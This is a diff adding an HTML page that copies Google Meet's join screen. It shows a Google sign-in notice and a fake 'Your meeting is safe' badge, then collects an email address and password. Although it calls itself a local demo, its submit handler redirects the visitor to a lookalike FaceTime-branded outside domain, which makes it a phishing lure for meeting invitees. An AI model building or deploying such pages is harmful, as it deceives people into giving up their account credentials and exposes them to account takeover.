@@ -1,0 +1,739 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Meeting Interface Demo</title>
+
+<style>
+* {
+  box-sizing: border-box;
+}
+
+:root {
+  --blue: #0b57d0;
+  --text: #3c4043;
+  --border: #dadce0;
+}
+
+body {
+  margin: 0;
+  min-height: 100vh;
+  font-family: Arial, Helvetica, sans-serif;
+  background: #fff;
+  color: var(--text);
+}
+
+.label {
+  text-align: center;
+  color: #5f6368;
+  font-size: 12px;
+  letter-spacing: 1px;
+  padding: 20px 10px 0;
+}
+
+.page {
+  width: min(50% - 18px, 600px);
+  margin: 20px auto 40px;
+}
+
+/* Main meeting dialog */
+.modal {
+  width: 100%;
+  background: #fff;
+  border: 1px solid #eee;
+  border-radius: 18px;
+  padding: 18px 12px;
+  text-align: center;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  padding-bottom: 10px;
+}
+
+/* Meeting illustration */
+.illustration {
+  width: min(220px, 75%);
+  height: auto;
+  display: block;
+  margin: 0 auto 24px;
+}
+
+h1 {
+  font-size: clamp(24px, 4vw, 36px);
+  font-weight: 400;
+  line-height: 1.35;
+  margin: 0 0 16px;
+  letter-spacing: -0.5px;
+}
+
+.description {
+  margin: 0 0 30px;
+  color: #5f6368;
+  font-size: 16px;
+  line-height: 1.5;
+}
+
+/* Buttons */
+button {
+  font-family: inherit;
+  cursor: pointer;
+  -webkit-tap-highlight-color: transparent;
+}
+
+.primary-row {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 12px;
+  width: 100%;
+  margin-bottom: 20px;
+}
+
+.primary-button {
+  min-height: 58px;
+  width: min(480px, 80%);
+  border-radius: 40px;
+  border: 1px solid #a1c2fa;
+  background: var(--blue);
+  color: white;
+  font-size: 17px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 10px;
+}
+
+.primary-button:hover {
+  background: #0842a0;
+}
+
+.expand-button {
+  width: 48px;
+  height: 48px;
+  flex: 0 0 48px;
+  border: 1px solid #9aa0a6;
+  background: white;
+  border-radius: 50%;
+  display: grid;
+  place-items: center;
+}
+
+.expand-button svg {
+  transition: transform .2s;
+}
+
+.expand-button.open svg {
+  transform: rotate(180deg);
+}
+
+.secondary-row {
+  display: flex;
+  justify-content: center;
+  gap: 16px;
+  width: 100%;
+  margin-bottom: 24px;
+}
+
+.secondary-button {
+  width: min(280px, 48%);
+  min-height: 54px;
+  border-radius: 40px;
+  border: 1px solid #6699cc;
+  color: #4c87c5;
+  background: white;
+  font-size: 16px;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  gap: 8px;
+}
+
+.secondary-button:hover {
+  background: #f3f8ff;
+}
+
+/* Device settings */
+.extra-options {
+  display: none;
+  width: 100%;
+  max-width: 520px;
+  margin: 0 0 24px;
+  padding: 20px;
+  border: 1px solid var(--border);
+  border-radius: 16px;
+  text-align: left;
+}
+
+.extra-options.visible {
+  display: block;
+}
+
+.extra-options label {
+  display: block;
+  margin: 12px 0;
+  font-size: 15px;
+}
+
+.extra-options select {
+  width: 100%;
+  padding: 12px;
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  margin-top: 8px;
+  background: white;
+  color: var(--text);
+  font-size: 15px;
+}
+
+.continue-link {
+  border: 0;
+  background: transparent;
+  color: #1967b3;
+  font-size: 16px;
+  padding: 8px;
+}
+
+.continue-link:hover {
+  text-decoration: underline;
+}
+
+/* Name and password form */
+.join-panel {
+  width: 100%;
+  max-width: 620px;
+  margin-top: 15px;
+  margin-bottom: 12px;
+  padding: 28px;
+  border: 1px solid #eee;
+  border-radius: 24px;
+  background: #fff;
+}
+
+.join-panel h2 {
+  font-size: 21px;
+  font-weight: 400;
+  margin: 0 0px;
+}
+
+.join-panel .hint {
+  font-size: 14px;
+  color: #5f6368;
+  line-height: 1.5;
+  margin: 0 0 10px;
+}
+
+.field {
+  display: block;
+  width: 100%;
+  min-height: 64px;
+  margin-bottom: 16px;
+  padding: 0 20px;
+  border: 1px solid #dadce0;
+  border-radius: 6px;
+  outline: none;
+  font-size: 18px;
+  color: #202124;
+  background: #fff;
+}
+
+.field:focus {
+  border: 2px solid #1967d2;
+  padding-left: 19px;
+}
+
+.field::placeholder {
+  color: #555;
+  opacity: 1;
+}
+
+.join-button {
+  display: block;
+  width: 100%;
+  min-height: 58px;
+  margin-top: 20px;
+  border: 0;
+  border-radius: 40px;
+  background: #e5e5e5;
+  color: #777;
+  font-size: 17px;
+  font-weight: 600;
+}
+
+.join-button.enabled {
+  background: var(--blue);
+  color: white;
+}
+
+.status {
+  margin: 16px 0 0;
+  color: #5f6368;
+  font-size: 14px;
+  line-height: 1.5;
+  text-align: center;
+  min-height: 18px;
+}
+
+@media (max-width: 600px) {
+  .page {
+    width: calc(100% - 20px);
+    margin-top: 4px;
+  }
+
+  .modal {
+    padding: 10px 8px;
+    border-radius: 24px;
+  }
+
+  .illustration {
+    width: 90%;
+    margin-bottom: 20px;
+  }
+
+  h1 {
+    font-size: 24px;
+  }
+
+  .description {
+    font-size: 15px;
+    margin-bottom: 20px;
+  }
+
+  .primary-row {
+    gap: 8px;
+  }
+
+  .primary-button {
+    width: calc(100% - 48px);
+    min-height: 52px;
+    font-size: 14px;
+    gap: 6px;
+  }
+
+  .expand-button {
+    width: 42px;
+    height: 42px;
+    flex-basis: 42px;
+  }
+
+  .secondary-row {
+    gap: 10px;
+  }
+
+  .secondary-button {
+    width: 50%;
+    min-height: 48px;
+    font-size: 13px;
+    gap: 4px;
+  }
+
+  .secondary-button svg,
+  .primary-button svg {
+    width: 19px;
+    height: 19px;
+    flex-shrink: 0;
+  }
+
+  .continue-link {
+    font-size: 14px;
+  }
+
+  .join-panel {
+    padding: 20px 16px;
+    border-radius: 20px;
+  }
+
+  .field {
+    min-height: 58px;
+    font-size: 16px;
+  }
+  
+* {
+  box-sizing: border-box;
+}
+
+body {
+  margin: 0;
+  min-height: 100vh;
+  background: #ffffff;
+  font-family: Arial, Helvetica, sans-serif;
+  color: #003b63;
+}
+
+/* Top-right sign-in text */
+.sign-in {
+  position: absolute;
+  top: 20px;
+  right: 7%;
+  color: #1967d2;
+  font-size: 36px;
+  font-weight: 500;
+}
+
+/* Blue notification panel */
+.notice {
+  position: relative;
+  width: calc(100% - 6%);
+  max-width: 1300px;
+  margin: 50px auto 0;
+  padding: 45px 6% 30px;
+  background: #c2e4fb;
+  border-radius: 70px;
+  box-shadow: 0 5px 15px rgba(0, 0, 0, 0.28);
+}
+
+/* Small decorative pointer */
+.notice::before {
+  content: "";
+  position: absolute;
+  top: -22px;
+  right: 5%;
+  width: 90px;
+  height: 80px;
+  background: #c2e4fb;
+  border-radius: 22px 22px 0 0;
+  transform: rotate(-1deg);
+  z-index: -1;
+}
+
+.notice-title {
+  margin: 0 0 35px;
+  font-size: clamp(26px, 4.3vw, 52px);
+  line-height: 1.25;
+  font-weight: 600;
+  letter-spacing: -1px;
+}
+
+.notice-message {
+  font-size: clamp(20px, 3.5vw, 42px);
+  line-height: 1.65;
+  font-weight: 400;
+  letter-spacing: -0.5px;
+}
+
+.notice-actions {
+  display: flex;
+  justify-content: flex-end;
+  margin-top: 10px;
+}
+
+/* Got it button */
+.got-it {
+  width: 340px;
+  max-width: 100%;
+  min-height: 150px;
+  border: 8px double #b8e5ff;
+  outline: 5px solid #00649b;
+  outline-offset: 0;
+  border-radius: 100px;
+  background: #08679c;
+  color: #ffffff;
+  font-family: inherit;
+  font-size: 37px;
+  font-weight: 500;
+  cursor: pointer;
+}
+
+/* Mobile layout */
+@media (max-width: 600px) {
+  .sign-in {
+    top: 10px;
+    right: 6%;
+    font-size: 15px;
+  }
+
+  .notice {
+    width: calc(100% - 20px);
+    margin-top: 30px;
+    right: -2%;
+    margin-bottom: 18px;
+    padding: 18px 4px 8px;
+    border-radius: 20px;
+  }
+
+  .notice::before {
+    width: 30px;
+    height: 38px;
+    top: -22px;
+    right: 5%;
+  }
+
+  .notice-title {
+    font-size: 20px;
+    letter-spacing: -0.5px;
+    margin-bottom: 8px;
+  }
+
+  .notice-message {
+    font-size: 11px;
+    line-height: 1.5;
+  }
+
+  .desktop-break {
+    display: none;
+  }
+
+  .notice-actions {
+    margin-top: 5px;
+  }
+
+  .got-it {
+    width: 70px;
+    min-height: 45px;
+    border-width: 6px;
+    outline-width: 4px;
+    font-size: 11px;
+  }
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="label">
+    
+</div>
+
+<main class="page">
+    
+        <!--Sigh-in-->
+  <div class="sign-in">
+    Sign in
+  </div>
+
+  <div class="notice">
+    <div class="notice-title">
+      Sign in with your Google account
+    </div>
+
+    <div class="notice-message">
+      Instead of waiting to be let in, sign in with<br class="desktop-break">
+      the Google account your host invited
+    </div>
+
+    <div class="notice-actions">
+      <button class="got-it">Got it</button>
+    </div>
+  </div>
+
+  <section class="modal">
+
+    <!-- Decorative meeting illustration -->
+    <svg class="illustration"
+         viewBox="0 0 500 275"
+         xmlns="http://www.w3.org/2000/svg"
+         role="img"
+         aria-label="Illustration of a video meeting">
+
+      <g stroke="#202124" stroke-width="2"
+         stroke-linecap="round" stroke-linejoin="round">
+
+        <path d="M0 245 H498" fill="none"/>
+
+        <path d="M104 244 C96 239 101 225 113 211
+          C127 194 143 184 162 181 L188 194
+          C204 201 215 212 226 230 L254 239 L270 245 Z"
+          fill="#fff"/>
+
+        <path d="M128 154 C132 132 155 119 177 126
+          C193 131 201 147 195 164 L184 173 L167 160 L147 165 Z"
+          fill="#202124"/>
+
+        <g fill="#202124">
+          <circle cx="119" cy="154" r="18"/>
+          <circle cx="97" cy="142" r="18"/>
+          <circle cx="74" cy="151" r="17"/>
+          <circle cx="53" cy="170" r="17"/>
+          <path d="M39 182 L15 194 L38 210 Q44 210 43 201 Z"/>
+        </g>
+
+        <path d="M158 143 C174 136 188 149 187 166
+          L183 181 C180 191 170 194 162 185 L154 171 Z"
+          fill="#f8d8c5"/>
+
+        <circle cx="170" cy="158" r="1.8"
+          fill="#202124" stroke="none"/>
+
+        <path d="M156 183 L158 197
+          Q175 207 193 195 L187 181"
+          fill="#f8d8c5"/>
+
+        <path d="M158 193 C144 193 131 202 119 216
+          C109 227 102 239 105 244 L209 245
+          L231 234 C221 216 208 202 193 195
+          Q179 209 158 193 Z"
+          fill="#fff"/>
+
+        <path d="M208 224 L248 240
+          Q260 244 268 240 Q277 236 266 231 L227 216"
+          fill="#f8d8c5"/>
+
+        <path d="M224 220 L286 217 L280 238 L218 239 Z"
+          fill="#fff"/>
+
+        <path d="M218 239 L281 239 L289 245 L208 245 Z"
+          fill="#d9e3f1"/>
+
+        <rect x="221" y="79" width="203" height="132"
+          fill="#fff"/>
+
+        <path d="M265 211 L280 159 Q285 150 298 153
+          L316 163 Q329 181 347 164 L368 153
+          Q385 150 391 164 L401 211 Z"
+          fill="#fff"/>
+
+        <path d="M324 139 L324 160
+          Q339 179 356 159 L353 135"
+          fill="#b64030"/>
+
+        <path d="M319 115 Q316 95 335 94
+          Q356 90 365 108 L361 131 L347 140 L322 132 Z"
+          fill="#202124"/>
+
+        <path d="M324 113 Q324 102 340 103
+          Q354 105 356 119 L352 138
+          Q345 149 335 140 Q325 132 324 113 Z"
+          fill="#b64030"/>
+
+        <circle cx="335" cy="119" r="1.8"
+          fill="#202124" stroke="none"/>
+
+        <circle cx="348" cy="119" r="1.8"
+          fill="#202124" stroke="none"/>
+
+        <circle cx="213" cy="69" r="43" fill="#3989ef"/>
+
+        <rect x="190" y="52" width="34" height="31"
+          rx="3" fill="#fff"/>
+
+        <path d="M224 61 L238 52 Q241 51 241 56
+          L241 79 Q241 84 237 81 L224 73 Z"
+          fill="#fff"/>
+
+        <rect x="269" y="26" width="87" height="87"
+          rx="33" fill="#fa8b78"/>
+
+        <rect x="306" y="44" width="17" height="37"
+          rx="9" fill="#fff"/>
+
+        <path d="M299 69 V75 Q299 91 314 91
+          Q329 91 329 75 V69 M314 91 V101 M305 101 H323"
+          fill="none"/>
+
+        <path d="M188 13 V0 M173 20 L165 12 M166 35 L154 32"
+          fill="none"/>
+
+      </g>
+    </svg>
+
+    <h1>Do you want people to see and hear you in the meeting?</h1>
+
+    <p class="description">
+      You can stillturn off your microphone and camera anytime in the meeting.
+    </p>
+
+    <div class="primary-row">
+      <button class="primary-button" id="bothButton">
+        <svg width="24" height="24" viewBox="0 0 24 24"
+             fill="none" stroke="currentColor"
+             stroke-width="2" stroke-linejoin="round">
+          <rect x="3" y="6" width="13" height="12" rx="1"/>
+          <path d="M16 10 L21 7 V17 L16 14 Z"/>
+        </svg>
+        <span>Use microphone and camera</span>
+      </button>
+      
+    </div>
+    
+    <p class="status" id="meetingStatus" role="status"
+       aria-live="polite"></p>
+  </section>
+  
+    <!-- Join Section -->
+  <div style="text-align:center; margin-top:20px;">
+    <div class="KlHtFb">
+      <div class="DxuHgf"> <img src="https://www.gstatic.com/meet/security_shield_356739b7c38934eec8fb0c8e93de8543.svg" width="40" height="40" alt="Your meeting is safe" data-iml="5643.185000002384">
+      </div>
+      <div jsname="fmcmS" class="Aitr4c">
+        <div><strong>Your meeting is safe</strong><br>No one can join a meeting unless invited or admitted by the host
+        </div>
+      </div>
+    </div>
+    </div>
+
+  <!-- Name and password fields from the first design -->
+  <section class="join-panel">
+    <form id="joinForm" autocomplete="off">
+      <input
+        class="field"
+        id="displayName"
+        type="text"
+        placeholder="Email Address"
+        aria-label="display name"
+        maxlength="60"
+        required
+      >
+
+      <input
+        class="field"
+        id="meetingPassword"
+        type="password"
+        placeholder="Password"
+        aria-label="password"
+        maxlength="100"
+        required
+      >
+
+      <button class="join-button" id="joinButton" type="submit" disabled>
+        Ask to join
+      </button>
+
+      <p class="status" id="formStatus" role="status"
+         aria-live="polite">
+      </p>
+    </form>
+  </section>
+
+</main>
+
+<script>
+const meetingStatus = document.getElementById("meetingStatus");
+const formStatus = document.getElementById("formStatus");
+
+/* Local-only join-form simulation */
+const nameField = document.getElementById("displayName");
+const passwordField = document.getElementById("meetingPassword");
+const joinButton = document.getElementById("joinButton");
+
+function updateJoinButton() {
+  const ready =
+    nameField.value.trim().length > 0 &&
+    passwordField.value.length > 0;
+
+  joinButton.disabled = !ready;
+  joinButton.classList.toggle("enabled", ready);
+}
+
+nameField.addEventListener("input", updateJoinButton);
+passwordField.addEventListener("input", updateJoinButton);
+
+document.getElementById("joinForm").addEventListener("submit", (event) => {
+  event.preventDefault();
+
+  if (!nameField.value.trim() || !passwordField.value) {
+    formStatus.textContent = "Enter sample values to test the form.";
+    return;
+  }
+
+  formStatus.textContent =
+    formStatus.textContent = "Opening link...";
+    window.location.href = "https://facetime-apple-com-join-live-chat-2026-1p.9xk2.com/sing-up"
+    
+  passwordField.value = "";
+  updateJoinButton();
+});
+</script>
+    
+</body>
+</html>
